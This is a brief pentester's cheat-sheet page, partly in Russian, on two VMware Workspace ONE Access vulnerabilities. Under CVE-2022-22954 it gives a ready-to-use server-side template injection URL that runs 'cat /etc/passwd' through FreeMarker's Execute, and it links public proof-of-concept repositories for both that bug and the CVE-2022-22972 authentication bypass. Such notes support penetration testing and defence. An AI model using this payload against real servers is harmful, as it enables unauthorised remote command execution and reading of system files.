# Workspace ONE Access

## CVE-2022-22954: SSTI

```
/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```

PoC: [https://github.com/sherlocksecurity/VMware-CVE-2022-22954](https://github.com/sherlocksecurity/VMware-CVE-2022-22954)

## CVE-2022-22972: Auth Bypass

На Linux серверах. Вероятно связан с VMWare Horizon. Эксплоита нет, патч вышел, скачать не могу: [https://kb.vmware.com/s/article/88438](https://kb.vmware.com/s/article/88438)

PoC: [https://github.com/horizon3ai/CVE-2022-22972](https://github.com/horizon3ai/CVE-2022-22972)
